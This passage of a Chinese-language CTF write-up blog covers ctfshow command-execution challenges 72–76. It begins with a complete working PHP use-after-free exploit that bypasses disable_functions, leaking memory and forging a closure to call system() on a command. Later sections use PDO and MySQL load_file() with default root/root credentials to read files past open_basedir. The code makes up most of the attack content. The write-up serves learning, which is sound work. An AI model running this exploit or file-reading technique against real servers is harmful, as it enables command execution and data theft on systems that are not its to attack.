class="line">++++++++++++global+$backtrace;+</span><br><span class="line">++++++++++++unset($this-&gt;a);</span><br><span class="line">++++++++++++$backtrace+=+(new+Exception)-&gt;getTrace();+#+;)</span><br><span class="line">++++++++++++if(!isset($backtrace[1][&apos;args&apos;]))+{+#+PHP+&gt;=+7.4</span><br><span class="line">++++++++++++++++$backtrace+=+debug_backtrace();</span><br><span class="line">++++++++++++}</span><br><span class="line">++++++++}</span><br><span class="line">++++}</span><br><span class="line"></span><br><span class="line">++++class+Helper+{</span><br><span class="line">++++++++public+$a,+$b,+$c,+$d;</span><br><span class="line">++++}</span><br><span class="line"></span><br><span class="line">++++function+str2ptr(&amp;$str,+$p+=+0,+$s+=+8)+{</span><br><span class="line">++++++++$address+=+0;</span><br><span class="line">++++++++for($j+=+$s-1;+$j+&gt;=+0;+$j--)+{</span><br><span class="line">++++++++++++$address+&lt;&lt;=+8;</span><br><span class="line">++++++++++++$address+|=+ord($str[$p+$j]);</span><br><span class="line">++++++++}</span><br><span class="line">++++++++return+$address;</span><br><span class="line">++++}</span><br><span class="line"></span><br><span class="line">++++function+ptr2str($ptr,+$m+=+8)+{</span><br><span class="line">++++++++$out+=+&quot;&quot;;</span><br><span class="line">++++++++for+($i=0;+$i+&lt;+$m;+$i++)+{</span><br><span class="line">++++++++++++$out+.=+sprintf(&quot;%c&quot;,($ptr+&amp;+0xff));</span><br><span class="line">++++++++++++$ptr+&gt;&gt;=+8;</span><br><span class="line">++++++++}</span><br><span class="line">++++++++return+$out;</span><br><span class="line">++++}</span><br><span class="line"></span><br><span class="line">++++function+write(&amp;$str,+$p,+$v,+$n+=+8)+{</span><br><span class="line">++++++++$i+=+0;</span><br><span class="line">++++++++for($i+=+0;+$i+&lt;+$n;+$i++)+{</span><br><span class="line">++++++++++++$str[$p+++$i]+=+sprintf(&quot;%c&quot;,($v+&amp;+0xff));</span><br><span class="line">++++++++++++$v+&gt;&gt;=+8;</span><br><span class="line">++++++++}</span><br><span class="line">++++}</span><br><span class="line"></span><br><span class="line">++++function+leak($addr,+$p+=+0,+$s+=+8)+{</span><br><span class="line">++++++++global+$abc,+$helper;</span><br><span class="line">++++++++write($abc,+0x68,+$addr+++$p+-+0x10);</span><br><span class="line">++++++++$leak+=+strlen($helper-&gt;a);</span><br><span class="line">++++++++if($s+!=+8)+{+$leak+%=+2+&lt;&lt;+($s+*+8)+-+1;+}</span><br><span class="line">++++++++return+$leak;</span><br><span class="line">++++}</span><br><span class="line"></span><br><span class="line">++++function+parse_elf($base)+{</span><br><span class="line">++++++++$e_type+=+leak($base,+0x10,+2);</span><br><span class="line"></span><br><span class="line">++++++++$e_phoff+=+leak($base,+0x20);</span><br><span class="line">++++++++$e_phentsize+=+leak($base,+0x36,+2);</span><br><span class="line">++++++++$e_phnum+=+leak($base,+0x38,+2);</span><br><span class="line"></span><br><span class="line">++++++++for($i+=+0;+$i+&lt;+$e_phnum;+$i++)+{</span><br><span class="line">++++++++++++$header+=+$base+++$e_phoff+++$i+*+$e_phentsize;</span><br><span class="line">++++++++++++$p_type++=+leak($header,+0,+4);</span><br><span class="line">++++++++++++$p_flags+=+leak($header,+4,+4);</span><br><span class="line">++++++++++++$p_vaddr+=+leak($header,+0x10);</span><br><span class="line">++++++++++++$p_memsz+=+leak($header,+0x28);</span><br><span class="line"></span><br><span class="line">++++++++++++if($p_type+==+1+&amp;&amp;+$p_flags+==+6)+{+#+PT_LOAD,+PF_Read_Write</span><br><span class="line">++++++++++++++++#+handle+pie</span><br><span class="line">++++++++++++++++$data_addr+=+$e_type+==+2+?+$p_vaddr+:+$base+++$p_vaddr;</span><br><span class="line">++++++++++++++++$data_size+=+$p_memsz;</span><br><span class="line">++++++++++++}+else+if($p_type+==+1+&amp;&amp;+$p_flags+==+5)+{+#+PT_LOAD,+PF_Read_exec</span><br><span class="line">++++++++++++++++$text_size+=+$p_memsz;</span><br><span class="line">++++++++++++}</span><br><span class="line">++++++++}</span><br><span class="line"></span><br><span class="line">++++++++if(!$data_addr+||+!$text_size+||+!$data_size)</span><br><span class="line">++++++++++++return+false;</span><br><span class="line"></span><br><span class="line">++++++++return+[$data_addr,+$text_size,+$data_size];</span><br><span class="line">++++}</span><br><span class="line"></span><br><span class="line">++++function+get_basic_funcs($base,+$elf)+{</span><br><span class="line">++++++++list($data_addr,+$text_size,+$data_size)+=+$elf;</span><br><span class="line">++++++++for($i+=+0;+$i+&lt;+$data_size+/+8;+$i++)+{</span><br><span class="line">++++++++++++$leak+=+leak($data_addr,+$i+*+8);</span><br><span class="line">++++++++++++if($leak+-+$base+&gt;+0+&amp;&amp;+$leak+-+$base+&lt;+$data_addr+-+$base)+{</span><br><span class="line">++++++++++++++++$deref+=+leak($leak);</span><br><span class="line">++++++++++++++++#+&apos;constant&apos;+constant+check</span><br><span class="line">++++++++++++++++if($deref+!=+0x746e6174736e6f63)</span><br><span class="line">++++++++++++++++++++continue;</span><br><span class="line">++++++++++++}+else+continue;</span><br><span class="line"></span><br><span class="line">++++++++++++$leak+=+leak($data_addr,+($i+++4)+*+8);</span><br><span class="line">++++++++++++if($leak+-+$base+&gt;+0+&amp;&amp;+$leak+-+$base+&lt;+$data_addr+-+$base)+{</span><br><span class="line">++++++++++++++++$deref+=+leak($leak);</span><br><span class="line">++++++++++++++++#+&apos;bin2hex&apos;+constant+check</span><br><span class="line">++++++++++++++++if($deref+!=+0x786568326e6962)</span><br><span class="line">++++++++++++++++++++continue;</span><br><span class="line">++++++++++++}+else+continue;</span><br><span class="line"></span><br><span class="line">++++++++++++return+$data_addr+++$i+*+8;</span><br><span class="line">++++++++}</span><br><span class="line">++++}</span><br><span class="line"></span><br><span class="line">++++function+get_binary_base($binary_leak)+{</span><br><span class="line">++++++++$base+=+0;</span><br><span class="line">++++++++$start+=+$binary_leak+&amp;+0xfffffffffffff000;</span><br><span class="line">++++++++for($i+=+0;+$i+&lt;+0x1000;+$i++)+{</span><br><span class="line">++++++++++++$addr+=+$start+-+0x1000+*+$i;</span><br><span class="line">++++++++++++$leak+=+leak($addr,+0,+7);</span><br><span class="line">++++++++++++if($leak+==+0x10102464c457f)+{+#+ELF+header</span><br><span class="line">++++++++++++++++return+$addr;</span><br><span class="line">++++++++++++}</span><br><span class="line">++++++++}</span><br><span class="line">++++}</span><br><span class="line"></span><br><span class="line">++++function+get_system($basic_funcs)+{</span><br><span class="line">++++++++$addr+=+$basic_funcs;</span><br><span class="line">++++++++do+{</span><br><span class="line">++++++++++++$f_entry+=+leak($addr);</span><br><span class="line">++++++++++++$f_name+=+leak($f_entry,+0,+6);</span><br><span class="line"></span><br><span class="line">++++++++++++if($f_name+==+0x6d6574737973)+{+#+system</span><br><span class="line">++++++++++++++++return+leak($addr+++8);</span><br><span class="line">++++++++++++}</span><br><span class="line">++++++++++++$addr++=+0x20;</span><br><span class="line">++++++++}+while($f_entry+!=+0);</span><br><span class="line">++++++++return+false;</span><br><span class="line">++++}</span><br><span class="line"></span><br><span class="line">++++function+trigger_uaf($arg)+{</span><br><span class="line">++++++++#+str_shuffle+prevents+opcache+string+interning</span><br><span class="line">++++++++$arg+=str_shuffle(&apos;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&apos;);</span><br><span class="line">++++++++$vuln+=+new+Vuln();</span><br><span class="line">++++++++$vuln-&gt;a+=+$arg;</span><br><span class="line">++++}</span><br><span class="line"></span><br><span class="line">++++if(stristr(PHP_OS,+&apos;WIN&apos;))+{</span><br><span class="line">++++++++die(&apos;This+PoC+is+for+*nix+systems+only.&apos;);</span><br><span class="line">++++}</span><br><span class="line"></span><br><span class="line">++++$n_alloc+=+10;+#+increase+this+value+if+UAF+fails</span><br><span class="line">++++$contiguous+=+[];</span><br><span class="line">++++for($i+=+0;+$i+&lt;+$n_alloc;+$i++)</span><br><span class="line">++++++++$contiguous[]+=+str_shuffle(&apos;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&apos;);</span><br><span class="line"></span><br><span class="line">++++trigger_uaf(&apos;x&apos;);</span><br><span class="line">++++$abc+=+$backtrace[1][&apos;args&apos;][0];</span><br><span class="line"></span><br><span class="line">++++$helper+=+new+Helper;</span><br><span class="line">++++$helper-&gt;b+=+function+($x)+{+};</span><br><span class="line"></span><br><span class="line">++++if(strlen($abc)+==+79+||+strlen($abc)+==+0)+{</span><br><span class="line">++++++++die(&quot;UAF+failed&quot;);</span><br><span class="line">++++}</span><br><span class="line"></span><br><span class="line">++++#+leaks</span><br><span class="line">++++$closure_handlers+=+str2ptr($abc,+0);</span><br><span class="line">++++$php_heap+=+str2ptr($abc,+0x58);</span><br><span class="line">++++$abc_addr+=+$php_heap+-+0xc8;</span><br><span class="line"></span><br><span class="line">++++#+fake+value</span><br><span class="line">++++write($abc,+0x60,+2);</span><br><span class="line">++++write($abc,+0x70,+6);</span><br><span class="line"></span><br><span class="line">++++#+fake+reference</span><br><span class="line">++++write($abc,+0x10,+$abc_addr+++0x60);</span><br><span class="line">++++write($abc,+0x18,+0xa);</span><br><span class="line"></span><br><span class="line">++++$closure_obj+=+str2ptr($abc,+0x20);</span><br><span class="line"></span><br><span class="line">++++$binary_leak+=+leak($closure_handlers,+8);</span><br><span class="line">++++if(!($base+=+get_binary_base($binary_leak)))+{</span><br><span class="line">++++++++die(&quot;Couldn&apos;t+determine+binary+base+address&quot;);</span><br><span class="line">++++}</span><br><span class="line"></span><br><span class="line">++++if(!($elf+=+parse_elf($base)))+{</span><br><span class="line">++++++++die(&quot;Couldn&apos;t+parse+ELF+header&quot;);</span><br><span class="line">++++}</span><br><span class="line"></span><br><span class="line">++++if(!($basic_funcs+=+get_basic_funcs($base,+$elf)))+{</span><br><span class="line">++++++++die(&quot;Couldn&apos;t+get+basic_functions+address&quot;);</span><br><span class="line">++++}</span><br><span class="line"></span><br><span class="line">++++if(!($zif_system+=+get_system($basic_funcs)))+{</span><br><span class="line">++++++++die(&quot;Couldn&apos;t+get+zif_system+address&quot;);</span><br><span class="line">++++}</span><br><span class="line"></span><br><span class="line">++++#+fake+closure+object</span><br><span class="line">++++$fake_obj_offset+=+0xd0;</span><br><span class="line">++++for($i+=+0;+$i+&lt;+0x110;+$i++=+8)+{</span><br><span class="line">++++++++write($abc,+$fake_obj_offset+++$i,+leak($closure_obj,+$i));</span><br><span class="line">++++}</span><br><span class="line"></span><br><span class="line">++++#+pwn</span><br><span class="line">++++write($abc,+0x20,+$abc_addr+++$fake_obj_offset);</span><br><span class="line">++++write($abc,+0xd0+++0x38,+1,+4);+#+internal+func+type</span><br><span class="line">++++write($abc,+0xd0+++0x68,+$zif_system);+#+internal+func+handler</span><br><span class="line"></span><br><span class="line">++++($helper-&gt;b)($cmd);</span><br><span class="line">++++exit();</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>


        <h2 id="73">
          <a href="#73" class="heading-link"><i class="fas fa-link"></i></a><a href="#73" class="headerlink" title="73"></a>73</h2>
      <p>&#x7528;&#x8001;&#x65B9;&#x6CD5;&#x53EF;&#x4EE5;&#x8BFB;&#xFF0C;&#x7136;&#x540E;&#x771F;&#x5B9E;&#x7684;&#x89C6;&#x9891;&#x89E3;&#x6CD5;&#x662F;&#xFF1A;&#x5728;72&#x57FA;&#x7840;&#x4E0A;&#x7981;&#x7528;&#x4E86;&#x811A;&#x672C;&#x91CC;&#x7684;&#x51FD;&#x6570;<code>strlen</code>,&#x7136;&#x540E;&#x4FEE;&#x6539;strlen&#x7684;&#x529F;&#x80FD;&#x4E3A;&#x81EA;&#x5DF1;&#x65B0;&#x5EFA;&#x7684;&#x51FD;&#x6570;&#x5373;&#x53EF;&#xFF0C;&#x53EF;&#x80FD;&#x4F1A;&#x6709;&#x5185;&#x5B58;&#x6EA2;&#x51FA;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x8FD9;&#x5927;&#x62B5;&#x662F;&#x5C5E;&#x4E8E;&#x811A;&#x672C;&#x4F18;&#x5316;&#x7684;&#x95EE;&#x9898;&#x4E86;</p>
<p>&#x63D0;&#x5230;&#x4E86;&#x65B0;&#x540D;&#x5B57;&#xFF1A;&#x6D41;&#x91CF;&#x6E05;&#x6D17;</p>
<p>&#x7136;&#x9E45;&#x6211;&#x751A;&#x81F3;&#x65E0;&#x6CD5;&#x6267;&#x884C;&#x811A;&#x672C;&#x3002;&#x3002;</p>
<p>&#xFF08;&#x597D;&#x6D88;&#x606F;&#x662F;&#x6211;&#x80FD;&#x8FD0;&#x884C;PHP&#x4E86;&#xFF0C;&#x901A;&#x8FC7;vscode,&#x4EE5;&#x540E;&#x4E0D;&#x7528;&#x518D;&#x8BD5;&#x8BB0;&#x4E8B;&#x672C;&#x5566;&#xFF09;</p>

        <h2 id="74">
          <a href="#74" class="heading-link"><i class="fas fa-link"></i></a><a href="#74" class="headerlink" title="74"></a>74</h2>
      <p>&#x540C;73</p>

        <h2 id="75">
          <a href="#75" class="heading-link"><i class="fas fa-link"></i></a><a href="#75" class="headerlink" title="75"></a>75</h2>
      <p>&#x901A;&#x8FC7;sql&#x8BED;&#x53E5;&#x8BFB;&#x6587;&#x4EF6;&#x6765;&#x7ED5;&#x8FC7;open_basedir&#x548C;disable_function</p>
<p>&#x5148;&#x7528;&#x4E4B;&#x524D;&#x7684;&#x65B9;&#x6CD5;&#x8BFB;&#x6587;&#x4EF6;&#xFF0C;&#x7136;&#x540E;&#x7528;sql&#x8BED;&#x53E5;&#x6765;&#x6784;&#x9020;</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.1</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$dsn</span>=<span class="string">&quot;mysql:host=localhost;dbname=information_schema&quot;</span>;</span><br><span class="line"><span class="variable">$db</span>=<span class="keyword">new</span> <span class="title class_">PDO</span>(<span class="variable">$dsn</span>,<span class="string">&apos;root&apos;</span>,<span class="string">&apos;root&apos;</span>);</span><br><span class="line"><span class="variable">$rs</span>=<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select database()&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$rs</span> <span class="keyword">as</span> <span class="variable">$row</span>){</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>].<span class="string">&quot;|&quot;</span>);</span><br><span class="line">}<span class="keyword">exit</span>();</span><br><span class="line"><span class="comment">//1.2</span></span><br><span class="line"><span class="variable">$dsn</span>=<span class="string">&quot;mysql:host=localhost;dbname=information_schema&quot;</span>;</span><br><span class="line"><span class="variable">$db</span>=<span class="keyword">new</span> <span class="title class_">PDO</span>(<span class="variable">$dsn</span>,<span class="string">&apos;root&apos;</span>,<span class="string">&apos;root&apos;</span>);</span><br><span class="line"><span class="variable">$rs</span>=<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select group_concat(SCHEMA_NAME) from SCHEMA&quot;</span>)&#xFF1B;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$rs</span> <span class="keyword">as</span> <span class="variable">$row</span>){</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>].<span class="string">&quot;|&quot;</span>);</span><br><span class="line">    }<span class="keyword">exit</span>();</span><br><span class="line"><span class="comment">//2</span></span><br><span class="line">c=</span><br><span class="line"><span class="keyword">try</span>{</span><br><span class="line">	<span class="variable">$dbh</span>=<span class="keyword">new</span> <span class="title class_">PDO</span>(<span class="string">&apos;mysql:host:localhost;dbname=ctftraining&apos;</span>,<span class="string">&apos;root&apos;</span>,<span class="string">&apos;root&apos;</span>);</span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$dbj</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&apos;select load_file(&quot;/flag36.txt&quot;)&apos;</span>)<span class="keyword">as</span> <span class="variable">$row</span>){</span><br><span class="line">		<span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>].<span class="string">&quot;|&quot;</span>);</span><br><span class="line">	}</span><br><span class="line">	<span class="variable">$dbn</span>=<span class="literal">null</span>;</span><br><span class="line">	}<span class="keyword">catch</span>(PODException <span class="variable">$e</span>){</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">		<span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">	}</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></div></figure>

<p>&#x4E0D;&#x61C2;&#x7684;&#x65E0;&#x975E;&#x5C31;&#x662F;&#x4EC0;&#x4E48;&#xFF1A;</p>
<p>dsn,try&#x548C;catch,sql&#x4E0E;php&#x7684;&#x7ED3;&#x5408;&#x7F62;&#x4E86;</p>
<p>dsn:data source name</p>
<p>dbsm:database system management</p>
<p>dbname:database name</p>
<p>dbh:data buffer handler</p>
<hr>
<p>&#x6B64;&#x5904;&#x7528;&#x5230;&#x7684;PDO&#x63A5;&#x53E3;&#x6D89;&#x53CA;&#x5230;&#x7684;:</p>
<p>php&#x4E2D;&#x7684;&#x5F02;&#x5E38;&#x5904;&#x7406;&#x7C7B;&#xFF1A;Exception</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Exception</span> {</span><br><span class="line">    <span class="comment">/* &#x5C5E;&#x6027; */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">string</span> <span class="variable">$message</span> ;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span> <span class="variable">$code</span> ;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">string</span> <span class="variable">$file</span> ;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span> <span class="variable">$line</span> ;</span><br><span class="line">    <span class="comment">/* &#x65B9;&#x6CD5; */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__construct</span> ([ <span class="keyword">string</span> <span class="variable">$message</span> = <span class="string">&quot;&quot;</span> [, <span class="keyword">int</span> <span class="variable">$code</span> = <span class="number">0</span> [, <span class="built_in">Throwable</span> <span class="variable">$previous</span> = <span class="literal">NULL</span> ]]] )</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getMessage</span> ( <span class="keyword">void</span> ) : <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getPrevious</span> ( <span class="keyword">void</span> ) : <span class="built_in">Throwable</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getCode</span> ( <span class="keyword">void</span> ) : <span class="keyword">int</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getFile</span> ( <span class="keyword">void</span> ) : <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getLine</span> ( <span class="keyword">void</span> ) : <span class="keyword">int</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getTrace</span> ( <span class="keyword">void</span> ) : <span class="keyword">array</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getTraceAsString</span> ( <span class="keyword">void</span> ) : <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__toString</span> ( <span class="keyword">void</span> ) : <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">private</span> <span class="title function_ invoke__">__clone</span> ( <span class="keyword">void</span> ) : <span class="keyword">void</span></span><br><span class="line">}</span><br></pre></td></tr></table></div></figure>

<p>&#x5728;&#x8FD9;&#x4E2A;&#x7C7B;&#x5F53;&#x4E2D;&#x76EE;&#x524D;&#x9047;&#x5230;&#x4E86;&#x4E24;&#x4E2A;&#x51FD;&#x6570;&#xFF1A;</p>
<p><code>getMessage(),__toString</code></p>
<p>&#x4E24;&#x4E2A;&#x5192;&#x53F7; (::)&#x662F;&#x5BF9;<strong>&#x7C7B;&#x4E2D;&#x7684;&#x65B9;&#x6CD5;&#x7684;&#x9759;&#x6001;&#x5F15;&#x7528;</strong></p>
<p>information_schema &#x770B;&#x4F5C;&#x662F;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x786E;&#x5207;&#x8BF4;&#x662F;&#x4FE1;&#x606F;&#x6570;&#x636E;&#x5E93;&#x3002;&#x5176;&#x4E2D;&#x4FDD;&#x5B58;&#x7740;&#x5173;&#x4E8E;MySQL&#x670D;&#x52A1;&#x5668;&#x6240;&#x7EF4;&#x62A4;&#x7684;&#x6240;&#x6709;&#x5176;&#x4ED6;&#x6570;&#x636E;&#x5E93;&#x7684;&#x4FE1;&#x606F;</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $dsn  = &apos;mysql:dbname=test;host=127.0.0.1&apos;;</span><br><span class="line">    $user = &apos;root&apos;;</span><br><span class="line">    $pwd  = &apos;root&apos;;</span><br><span class="line">    try{</span><br><span class="line">        $obj = new PDO($dsn,$user,$pwd);</span><br><span class="line">    }catch(PDOException $e){</span><br><span class="line">        echo &apos;&#x6570;&#x636E;&#x5E93;&#x8FDE;&#x63A5;&#x5931;&#x8D25;&#xFF1A;&apos;.$e -&gt; getMessage();</span><br><span class="line">    }</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>



<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1918345">Mysql&#x6CE8;&#x5165;&#x4E2D;load_file()&#x51FD;&#x6570;&#x7684;&#x4F7F;&#x7528;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://c.biancheng.net/view/7705.html">PHP PDO&#x662F;&#x4EC0;&#x4E48; (biancheng.net)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>&#x8FD9;&#x662F;&#x4E2A;&#x8BB2;php&#x4E0E;mysql&#x5168;&#x9762;&#x7684;&#x7F51;&#x7AD9;</p>

        <h2 id="76">
          <a href="#76" class="heading-link"><i class="fas fa-link"></i></a><a href="#76" class="headerlink" title="76"></a>76</h2>
      <p>&#x597D;&#x8036;&#xFF0C;&#x56F0;&#x6270;&#x4E86;10&#x5929;&#x7684;&#x95EE;&#x9898;&#x89E3;&#x51B3;&#x5566;hhh,&#x539F;&#x6765;&#x53EA;&#x8981;&#x95EE;&#x95EE;&#x5927;&#x54E5;&#x7684;&#x8BDD;&#x5C31;&#x80FD;&#x89E3;&#x51B3;&#xFF0C;&#x81EA;&#x5DF1;&#x6363;&#x9F13;&#x534A;&#x5929;&#x5F88;&#x6CA1;&#x6709;&#x6210;&#x679C;</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> {</span><br><span class="line">    <span class="variable">$dbh</span> = <span class="keyword">new</span> <span class="title class_">PDO</span>(<span class="string">&apos;mysql:host=localhost;dbname=ctftraining&apos;</span>, <span class="string">&apos;root&apos;</span>,<span class="string">&apos;root&apos;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&apos;select load_file(&quot;/flag36d.txt&quot;)&apos;</span>) <span class="keyword">as</span> <span class="variable">$row</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>; </span><br><span class="line">    }</span><br><span class="line">    <span class="variable">$dbh</span> = <span class="literal">null</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) </span><br><span class="line">{</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>



<p>wp&#x4E0A;&#x8BF4;&#x8BFB;&#x53D6;&#x6570;&#x636E;&#x5E93;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x5176;&#x5B9E;&#x5E76;&#x4E0D;&#x9700;&#x8981;&#xFF0C;&#x8FD9;&#x9053;&#x9898;&#x76EE;&#x662F;&#x4F7F;&#x7528;&#x7684;&#x5F31;&#x53E3;&#x4EE4;&#xFF0C;root&#xFF0C;root</p>
<p>&#x5B66;&#x957F;&#x8BF4;&#x53EF;&#x4EE5;&#x7528;bp&#x7206;&#x7834;&#x770B;&#x4E00;&#x773C;&#xFF0C;&#x800C;&#x4E14;&#x4E0D;&#x53EA;&#x662F;&#x7528;ctftraining&#x8FD9;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x540D;&#x5B57;&#x8FD8;&#x53EF;&#x4EE5;&#x7528;&#x5176;&#x4ED6;&#x7684;mysql&#x5185;&#x7F6E;&#x7684;&#x6570;&#x636E;&#x5E93;&#x540D;&#x5B57;</p>
<p>&#x8BD5;&#x4E86;&#x4E00;&#x4E0B;&#x6709;</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql</span><br><span class="line">information_schema</span><br><span class="line">ctftraining</span><br></pre></td></tr></table></div></figure>

<p>&#x90FD;&#x53EF;&#x4EE5;&#x5F97;&#x5230;flag</p>
<p>&#x554A;&#xFF0C;&#x8FD8;&#x6709;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;</p>
<p>&#x8BED;&#x6CD5;&#x4E0A;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x5C31;&#x662F;<code>echo($row[0]).&quot;|&quot;; </code>&#xFF0C;&#x8FD9;&#x662F;&#x4E2A;&#x751A;&#x4E48;&#x4E1C;&#x897F;&#xFF0C;&#x6570;&#x7EC4;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x5143;&#x7D20;&#xFF1F;row&#x662F;&#x4E00;&#x4E2A;&#x4E8C;&#x7EF4;&#x6570;&#x7EC4;&#xFF1F;</p>
</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="http://example.com">Kirsten Carton</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="http://example.com/2022/06/20/6-20/">http://example.com/2022/06/20/6-20/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://example.com/tags/ctfshow/">ctfshow</a></span><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2022/07/14/web%E6%80%BB%E7%BB%93/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">web总结</span></a></div><div class="paginator-next"><a class="paginator-next__link" 